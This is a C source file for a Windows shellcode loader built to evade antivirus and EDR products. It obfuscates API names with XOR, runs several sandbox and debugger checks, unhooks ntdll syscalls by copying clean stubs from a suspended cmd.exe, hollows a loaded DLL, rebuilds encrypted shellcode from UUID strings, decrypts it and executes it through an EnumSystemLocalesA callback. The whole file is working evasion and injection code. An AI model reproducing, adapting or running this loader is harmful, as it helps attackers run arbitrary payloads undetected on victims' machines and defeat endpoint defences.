
#include <Windows.h>
#include <TlHelp32.h>
#include <Rpc.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>

#pragma comment (lib, "Rpcrt4.lib")

#define GETIMAGESIZE(x) (x->pNtHdr->OptionalHeader.SizeOfImage)
#define GETMODULEBASE(x) ((PVOID)x->pDosHdr)
#define STARTSWITHA(x1, x2) ((strlen(x2) > strlen(x1)) ? FALSE : ((BOOL)RtlEqualMemory(x1, x2, strlen(x2))))
#define ENDSWITHW(x1, x2) ((wcslen(x2) > wcslen(x1)) ? FALSE : ((BOOL)RtlEqualMemory(x1 + wcslen(x1) - wcslen(x2), x2, wcslen(x2))))

#if defined(_WIN64)
#define SYSCALLSIZE 0x20
#else
#define SYSCALLSIZE 0x10
#endif

#define KEY 0xfb
#define KEYSIZE sizeof(decKey) - 1
#define SHELLSIZE 0x1cc


typedef struct
{
    PIMAGE_DOS_HEADER pDosHdr;
    PIMAGE_NT_HEADERS pNtHdr;
    PIMAGE_EXPORT_DIRECTORY pExpDir;
    PIMAGE_SECTION_HEADER pTextSection;
} IMAGE, *PIMAGE;


/* PEB structures redefintion */
typedef struct _UNICODE_STR
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, *PUNICODE_STR;

typedef struct _PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK *pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, *_PPEB;


typedef HANDLE(WINAPI *CreateFileAFunc)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL(WINAPI *ReadProcessMemoryFunc)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T *);
typedef BOOL(WINAPI *TerminateProcessFunc)(HANDLE, UINT);
typedef LPVOID(WINAPI *VirtualAllocFunc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID(WINAPI *VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);


DWORD g_dwNumberOfHooked = 0;

char cLib1Name[] = { 0x90, 0x9e, 0x89, 0x95, 0x9e, 0x97, 0xc8, 0xc9, 0xd5, 0x9f, 0x97, 0x97, 0x0 };
char cLib2Name[] = { 0x96, 0x88, 0x93, 0x8f, 0x96, 0x97, 0xd5, 0x9f, 0x97, 0x97, 0x0 };
char cCreateFileA[] = { 0xb8, 0x89, 0x9e, 0x9a, 0x8f, 0x9e, 0xbd, 0x92, 0x97, 0x9e, 0xba, 0x0 };
char cCreateProcessA[] = { 0xb8, 0x89, 0x9e, 0x9a, 0x8f, 0x9e, 0xab, 0x89, 0x94, 0x98, 0x9e, 0x88, 0x88, 0xba, 0x0 };
char cReadProcessMemory[] = { 0xa9, 0x9e, 0x9a, 0x9f, 0xab, 0x89, 0x94, 0x98, 0x9e, 0x88, 0x88, 0xb6, 0x9e, 0x96, 0x94, 0x89, 0x82, 0x0 };
char cTerminateProcess[] = { 0xaf, 0x9e, 0x89, 0x96, 0x92, 0x95, 0x9a, 0x8f, 0x9e, 0xab, 0x89, 0x94, 0x98, 0x9e, 0x88, 0x88, 0x0 };
char cVirtualAlloc[] = { 0xad, 0x92, 0x89, 0x8f, 0x8e, 0x9a, 0x97, 0xba, 0x97, 0x97, 0x94, 0x98, 0x0 };
char cVirtualProtect[] = { 0xad, 0x92, 0x89, 0x8f, 0x8e, 0x9a, 0x97, 0xab, 0x89, 0x94, 0x8f, 0x9e, 0x98, 0x8f, 0x0 };

char decKey[] = { 0x9e, 0x92, 0x8e, 0x81, 0x92, 0x95, 0x8f, 0x89, 0x90, 0x91, 0x9c, 0x95, 0x9c, 0x9d, 0x95, 0x89, 0x8f, 0x92, 0x94, 0x94, 0x95, 0x92, 0x9e, 0x89, 0x94, 0x95, 0x92, 0x89, 0x9e, 0x95, 0x92, 0x94, 0x89, 0x9e, 0x8f, 0x92, 0x94, 0x8f, 0x9e, 0x99, 0x8e, 0x92, 0x8f, 0x89, 0x92, 0x94, 0x89, 0x9e, 0x8f, 0x99, 0x8e, 0x92, 0x89, 0x8f, 0x99, 0x8e, 0x92, 0x8f, 0x89, 0x99, 0x8e, 0x92, 0x0 };

const char *uuids[] = {
        "9ef62199-8699-72b4-6b6a-263f26363c23",
        "bd5e2122-210b-20ee-0f26-e2207d26e23d",
        "1bff2d52-3c3f-d56a-3f23-3943a02743a5",
        "15145ed8-5870-3442-a8bd-7f2374a88784",
        "26383b27-20ff-e14b-2552-2f67bef9f4e1",
        "216e6f6f-b2e0-091b-2173-b53ee2276a21",
        "3d4f29ff-b264-3f96-3c8d-a02ef951fc2a",
        "453fbf74-3dab-b458-de23-b4a0682874bb",
        "83018e51-6927-4a2b-6f23-57a301b1372b",
        "3b4129e5-be6e-330f-ee62-212bf9256820",
        "e924a46e-e171-733c-b92e-2a242c3c2c33",
        "2c232c33-2e28-e13a-9949-243b8a9a312f",
        "e123282d-8775-9930-918d-2920d1181d5b",
        "6e5d413a-3369-2733-e089-3ae498c96e74",
        "8cfc2b65-ce3d-6f6b-56d4-7e787f6b3320",
        "388dfc2b-93fb-d334-291e-537d96bb38fb",
        "6f660281-6667-3337-ce40-ef046e96b022",
        "bb58233f-5f28-27a9-8da5-3ce0ad3c9aa2",
        "33b5e03d-85d3-ba7d-949d-a021fbb30865",
        "eb3e2c28-2197-90ec-34c0-f0cb001394bf",
        "26a3ef2f-726c-2074-d70c-030d65726f6e",
        "2f353369-2739-87fb-233e-383954a21f64",
        "8d39332d-038e-26b3-513d-73752af82d50",
        "0175a46a-e02d-2c93-392f-24333b2b3727",
        "222fa698-963d-22a7-e7a8-29fbae2fd30b",
        "90ef51a9-2da7-bb45-278b-afe97b28ce7a",
        "9a1272ee-d9a1-dc85-d022-23cfcfe1cfff",
        "ea2dbc8a-52b1-6855-0878-eb91871b62dd",
        "06066129-6f05-2837-eca8-90bb90909090"
};

unsigned char *pShell; 


CreateFileAFunc pCreateFileAFunc;
CreateProcessAFunc pCreateProcessAFunc;
ReadProcessMemoryFunc pReadProcessMemoryFunc;
TerminateProcessFunc pTerminateProcessFunc;
VirtualAllocFunc pVirtualAllocFunc;
VirtualProtectFunc pVirtualProtectFunc;


_PPEB GetPEB()
{
    /* 
        Get Process Environment Block without call any winapi like NtQueryInformationProcess, 
        By reading fs/gs registers, read the link below to know more about what is these registers.
        => https://stackoverflow.com/questions/10810203/what-is-the-fs-gs-register-intended-for
    */
#if defined(_WIN64)
    /*
        ; mov rax, gs:[60h]
    */
    return (_PPEB)__readgsqword(0x60);
#else
    /*
        ; mov eax, fs:[30h]
    */
    return (_PPEB)__readfsdword(0x30);
#endif
}

PVOID FindNtDLL(_PPEB pPEB)
{
    /*
        Parse Process Environment Block and obtaine ntdll base address from it,
        Very useful resource about PEB => https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block
    */
    PVOID pDllBase = NULL;

    /* Get LoaDeR data structure which contains information about all of the loaded modules */
    PPEB_LDR_DATA pLdr = pPEB->pLdr;
    PLDR_DATA_TABLE_ENTRY pLdrData;
    PLIST_ENTRY pEntryList = &pLdr->InMemoryOrderModuleList;
    
    /* Walk through module list */
    for (PLIST_ENTRY pEntry = pEntryList->Flink; pEntry != pEntryList; pEntry = pEntry->Flink)
    {
        pLdrData = (PLDR_DATA_TABLE_ENTRY)pEntry;

        /* If the module ends with ntdll.dll, get its base address */
        if (ENDSWITHW(pLdrData->FullDllName.pBuffer, L"ntdll.dll"))
        {
            pDllBase = (PVOID)pLdrData->DllBase;
            break;
        }

    }
    
    return pDllBase;
}


PIMAGE ParseImage(PBYTE pImg)
{
    /*
        You can read these resources to know more about PEs
        Intro => https://resources.infosecinstitute.com/topic/2-malware-researchers-handbook-demystifying-pe-file/
        Detailed => https://learn.microsoft.com/en-us/windows/win32/debug/pe-format
    */
    PIMAGE pParseImg;

    /* Allocate memory space for the image */
    if (!(pParseImg = (PIMAGE) malloc(sizeof(IMAGE))))
    {
        return NULL;
    }

    /* Parse DOS Header */
    pParseImg->pDosHdr = (PIMAGE_DOS_HEADER)pImg;

    /* Check if we parse a valid image or not */
    if (pParseImg->pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
    {
        /* 
            This isn't a valid image,
            Every image has a fixed magic number ==> 0x5a4d
        */

        free(pParseImg);
        return NULL;
    }

    /* Parse NT Header */
    pParseImg->pNtHdr = (PIMAGE_NT_HEADERS)((DWORD_PTR)pImg + pParseImg->pDosHdr->e_lfanew);
	
    /* Check if this is the NT header or not */
    if (pParseImg->pNtHdr->Signature != IMAGE_NT_SIGNATURE)
    {
        free(pParseImg);
        return NULL;
    }
	
    /* Parse Export Directory */
    pParseImg->pExpDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)pImg + pParseImg->pNtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);
	
    /* Parse .text section, it's a first section */
    pParseImg->pTextSection = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pParseImg->pNtHdr);
	
    return pParseImg;
}

PVOID GetFreshCopy(PIMAGE pHookedImg)
{
    /*
        Create a suspended process and retrieve a fresh copy from it
        Before get hooked by AV/EDRs.

        => https://blog.sektor7.net/#!res/2021/perunsfart.md
    */

    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    PVOID pDllBase;
    SIZE_T nModuleSize, nBytesRead = 0;

    if (
        !pCreateProcessAFunc(
        NULL, 
        (LPSTR)"cmd.exe", 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, 
        NULL, 
        (LPCSTR)"C:\\Windows\\System32\\", 
        &si, 
        &pi)
    )
        return NULL;

    nModuleSize = GETIMAGESIZE(pHookedImg);

    /* Allocate Memory for the fresh copy */
    if (!(pDllBase = (PVOID)pVirtualAllocFunc(NULL, nModuleSize, MEM_COMMIT, PAGE_READWRITE)))
        return NULL;

    /* Read a fresh copy from the process */
    if (!pReadProcessMemoryFunc(pi.hProcess, (LPCVOID)GETMODULEBASE(pHookedImg), pDllBase, nModuleSize, &nBytesRead))
        return NULL;

    /* We don't need the process anymore */
    pTerminateProcessFunc(pi.hProcess, 0);

    return pDllBase;
}

PVOID FindEntry(PIMAGE pFreshImg, PCHAR cFunctionName) {
    /* Get needed information from the Export Directory */
    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfNames);
    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)GETMODULEBASE(pFreshImg) + pFreshImg->pExpDir->AddressOfNameOrdinals);

    for (WORD idx = 0; idx < pFreshImg->pExpDir->NumberOfNames; idx++) {
        PCHAR cFuncName = (PCHAR)GETMODULEBASE(pFreshImg) + pdwAddrOfNames[idx];
        PBYTE pFuncAddr = (PBYTE)GETMODULEBASE(pFreshImg) + pdwAddrOfFunctions[pwAddrOfNameOrdinales[idx]];

        if (strcmp(cFuncName, cFunctionName) == 0)
        {
#if defined(_WIN64)
            WORD wCtr = 0;

            while(TRUE)
            {
                /* If we reach syscall instruction before --> <mov r10, rcx> */
                if (RtlEqualMemory(pFuncAddr + wCtr, "\x0f\x05", 2))
                    break;
            
                /* ret instruction (the end of the syscall) */
                if (*(pFuncAddr + wCtr) == 0xc3)
                    break;

                /*
                  Syscalls starts with the following instrucions
                  ; mov r10, rcx
                  ; mov eax, ...

                  If we reach this pattern, this is what we search about.
                */
                if (RtlEqualMemory(pFuncAddr + wCtr, "\x4c\x8b\xd1\xb8", 4) && 
                    RtlEqualMemory(pFuncAddr + wCtr + 6, "\x00\x00", 2)
                )
                {
                    return pFuncAddr;
                }

                wCtr++;
            }
#else
            if (STARTSWITHA(cFuncName, "Nt") || STARTSWITHA(cFuncName, "Zw"))
                return pFuncAddr;
#endif

        }
    }

    return NULL;
}

BOOL IsHooked(PVOID pAPI)
{
    /* If the first syscall instruction was jmp, it's hooked */
    if (*((PBYTE)pAPI) == 0xe9)
    {
        g_dwNumberOfHooked++;
        return TRUE;
    }

    return FALSE;
}

BOOL RemoveHooks(PIMAGE pHookedImg, PIMAGE pFreshImg)
{
    PCHAR cFuncName;
    PBYTE pFuncAddr;
    PVOID pFreshFuncAddr;
    DWORD dwOldProtect = 0;

    /* Get the Addresses of the functions and names from Export Directory */
    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfNames);
    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)GETMODULEBASE(pHookedImg) + pHookedImg->pExpDir->AddressOfNameOrdinals);

    /* Change page permission of .text section to patch it */
    if (!pVirtualProtectFunc((LPVOID)((DWORD_PTR)GETMODULEBASE(pHookedImg) + pHookedImg->pTextSection->VirtualAddress), pHookedImg->pTextSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        return FALSE;

    for (WORD idx = 0; idx < pHookedImg->pExpDir->NumberOfNames; idx++)
    {
        cFuncName = (PCHAR)GETMODULEBASE(pHookedImg) + pdwAddrOfNames[idx];
        pFuncAddr = (PBYTE)GETMODULEBASE(pHookedImg) + pdwAddrOfFunctions[pwAddrOfNameOrdinales[idx]];

        /* Get only Nt/Zw APIs */
        if (STARTSWITHA(cFuncName, "Nt") || STARTSWITHA(cFuncName, "Zw"))
        {
#if defined(_WIN64)
            /* Exclude these APIs, because they have a jmp instruction */
            if (RtlEqualMemory(cFuncName, "NtQuerySystemTime", 18) || RtlEqualMemory(cFuncName, "ZwQuerySystemTime", 18))
                continue;
#endif

            if (IsHooked(pFuncAddr))
            {
                /* Find the clean syscall from the fresh copy, to patch the hooked syscall */
                if ((pFreshFuncAddr = FindEntry(pFreshImg, cFuncName)) != NULL)
                    /* Patch it */
                    RtlCopyMemory(pFuncAddr, pFreshFuncAddr, SYSCALLSIZE);					
	
            }
        }
    }

    /* Back the old permission */
    if (!pVirtualProtectFunc((LPVOID)((DWORD_PTR)GETMODULEBASE(pHookedImg) + pHookedImg->pTextSection->VirtualAddress), pHookedImg->pTextSection->Misc.VirtualSize, dwOldProtect, &dwOldProtect))
        return FALSE;

	
    return TRUE;
}

BOOL UnHookNtDLL(PVOID pNtDLL)
{
    PVOID pFreshNtDLL;
    PIMAGE pHookedImg, pFreshImg;
    BOOL bRet;

    /* Parse ntdll */
    if (!(pHookedImg = ParseImage((PBYTE)pNtDLL)))
        return FALSE;

    /* Get a clean copy of ntdll.dll */
    if (!(pFreshNtDLL = GetFreshCopy(pHookedImg)))
        return FALSE;

    /* Parse the fresh copy */
    if (!(pFreshImg = ParseImage((PBYTE)pFreshNtDLL)))
        return FALSE;

    /* Remove hooks from hooked syscalls one by one */
    bRet = RemoveHooks(pHookedImg, pFreshImg);

    /* Deallocate memory */
    free(pHookedImg);
    free(pFreshImg);

    return bRet;
}


BOOL FindProcById(DWORD dwProcId, PROCESSENTRY32 *pe32)
{

    HANDLE hSnapshot;
    BOOL bSuccess = FALSE;

    if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) != INVALID_HANDLE_VALUE)
    {
        pe32->dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, pe32)) 
        {
            do {
                if (pe32->th32ProcessID == dwProcId)
                {
                    bSuccess = TRUE;
                    break;
                }
            } while (Process32Next(hSnapshot, pe32));
        }

        CloseHandle(hSnapshot);
    } 

    return bSuccess;
}


void deObfuscateData(char *data)
{
    for (int idx = 0; idx < strlen(data); idx++)
    {
        data[idx] = data[idx] ^ KEY;
    }
    
}

void deObfuscateAll()
{
    deObfuscateData(decKey);
    deObfuscateData(cLib1Name);
    deObfuscateData(cLib2Name);
    deObfuscateData(cCreateFileA);
    deObfuscateData(cCreateProcessA);
    deObfuscateData(cReadProcessMemory);
    deObfuscateData(cTerminateProcess);
    deObfuscateData(cVirtualAlloc);
    deObfuscateData(cVirtualProtect);
}

void decShell()
{
    for (int idx = 0, ctr = 0; idx < SHELLSIZE; idx++)
    {
        ctr = (ctr == KEYSIZE) ? 0 : ctr;
        pShell[idx] = pShell[idx] ^ decKey[ctr++];
    }

}

int _tmain(int argc, TCHAR **argv)
{  
    _PPEB pPEB;
    PVOID pNtDLL;
    DWORD_PTR pFuncAddr, pShellReader;
    DWORD dwOldProtect = 0;
    HMODULE hModule, hModule2;
    char *pMem;
    int nMemAlloc, nCtr = 0;
    PROCESSENTRY32 pe32;

    printf("1");
    getchar();

    if (FindProcById(GetCurrentProcessId(), &pe32))
    {
        _tprintf(TEXT("Current pid = %d, exename = %s\n"), pe32.th32ProcessID, pe32.szExeFile);
        printf("We found the parent proccess id -> %d\n", pe32.th32ParentProcessID);

        if (FindProcById(pe32.th32ParentProcessID, &pe32))
        {
            _tprintf(TEXT("The parent process is %s\n"), pe32.szExeFile);

            /* We expect that will be run from cmd or powershell, else maybe we're inside sandbox */
            if (!(_tcscmp(pe32.szExeFile, TEXT("cmd.exe")) == 0 || _tcscmp(pe32.szExeFile, TEXT("powershell.exe")) == 0))
                return EXIT_FAILURE;
        }
    }

    puts("Deobfuscate all (APIs, Libraries, Decryption key)");
    deObfuscateAll();

    printf("2");
    getchar();
    
    /* Load needed libs */
    if (!(
        (hModule = LoadLibraryA((LPCSTR)cLib1Name)) &&
        (hModule2 = LoadLibraryA((LPCSTR)cLib2Name))
    )) {
        return EXIT_FAILURE;
    }

    /* Get the Addresses of the APIs */
    if (!(
        (pCreateFileAFunc = (CreateFileAFunc) GetProcAddress(hModule, cCreateFileA)) &&
        (pCreateProcessAFunc = (CreateProcessAFunc) GetProcAddress(hModule, cCreateProcessA)) &&
        (pReadProcessMemoryFunc = (ReadProcessMemoryFunc) GetProcAddress(hModule, cReadProcessMemory)) &&
        (pTerminateProcessFunc = (TerminateProcessFunc) GetProcAddress(hModule, cTerminateProcess)) &&
        (pVirtualAllocFunc = (VirtualAllocFunc) GetProcAddress(hModule, cVirtualAlloc)) &&
        (pVirtualProtectFunc = (VirtualProtectFunc) GetProcAddress(hModule, cVirtualProtect))
    )) {
        return EXIT_FAILURE;
    }

    /* Check for a non-exist file, if found it we're inside sandbox */
    if (pCreateFileAFunc(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE)
    {
        return EXIT_FAILURE;
    }

    pPEB = GetPEB();
    
    /* Check if the process under debugger */
    if (pPEB->bBeingDebugged)
    {
        puts("The current process running under debugger");
        return EXIT_FAILURE;
    }

    /* 
        Move key bits to left, let's say the key is 0xfa,
        Will represented as following in memory :
            -> 00000000 00000000 00000000 11111010

        After moving will be :
            -> 00001111 10100000 00000000 00000000

        That's a very large number.
    */
    nMemAlloc = KEY << 20;

    /* Ask os for very large memory, if fail maybe we're inside sandbox */
    if (!(pMem = (char *) malloc(nMemAlloc)))
    {
        return EXIT_FAILURE;
    }

    /* Make large iterations */
    for (int idx = 0; idx < nMemAlloc; idx++)
    {
        /* Count every iteration one by one */
        pMem[nCtr++] = 0x00;
    }
    
    /* If number of iterations and the counter isn't same, we're inside sandbox */
    if (nMemAlloc != nCtr)
    {
        return EXIT_FAILURE;
    }

    /* Deallocate memory */
    free(pMem);

    puts("Try to find ntdll.dll base address from PEB, without call GetModuleHandle/LoadLibrary");
    if(!(pNtDLL = FindNtDLL(pPEB)))
    {
        puts("Could not find ntdll.dll");
        return EXIT_FAILURE;
    }

    printf("ntdll base address = %p\n", pNtDLL);

    puts("Try to unhook ntdll");
    if (!UnHookNtDLL(pNtDLL))
    {
        puts("Something goes wrong in UnHooking phase");
        return EXIT_FAILURE;
    }

    if (g_dwNumberOfHooked != 0)
        printf("There were %d hooked syscalls\n", g_dwNumberOfHooked);

    else
        puts("There are no hooked syscalls");
        
    printf("3");
    getchar();
    /* 
        DLL hollowing to bypass memory monitoring.
        Useful resource --> https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
        DLL Base Addr + 0x1000 = RWX section.
        We can parse it and obtain the same result.
    */
    pFuncAddr = (DWORD_PTR) hModule2 + 0x1000;

    /* Shell will point to the hollowed address */
    pShell = (unsigned char *) pFuncAddr;

    /* This will read shellcode from UUIDs, and reflect it in the hollowed DLL directly */
    pShellReader = (DWORD_PTR) pShell;

    printf("Shellcode will be written at %p\n", pShell);

    /* Change permission of the section, to overwrite it */
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, PAGE_READWRITE, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    puts("Deobfuscate UUIDs, and obtain encrypted shellcode from it");

    for (int idx = 0; idx < sizeof(uuids) / sizeof(PCHAR); idx++)
    {
        if (UuidFromStringA((RPC_CSTR)uuids[idx], (UUID *)pShellReader) == RPC_S_INVALID_STRING_UUID)
        {
            return EXIT_FAILURE;
        }
        
        /* We have read 16 byte (The size of each UUID), let's move to the next memory space */
        pShellReader += 0x10;
    }
    printf("4");
    getchar();

    puts("Decrypt shellcode");
    decShell();
    
    printf("5");
    getchar();
    
    /* Back the old permission */
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, dwOldProtect, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    printf("6");
    getchar();
    
    puts("Inject shellcode, without creating a new thread");

    /* 
        No new thread payload execution, 
        Creating a new thread is a bad thing (can be monitored by EDRs)
    */
    return EnumSystemLocalesA((LOCALE_ENUMPROCA)pFuncAddr, LCID_SUPPORTED) != 0;

}

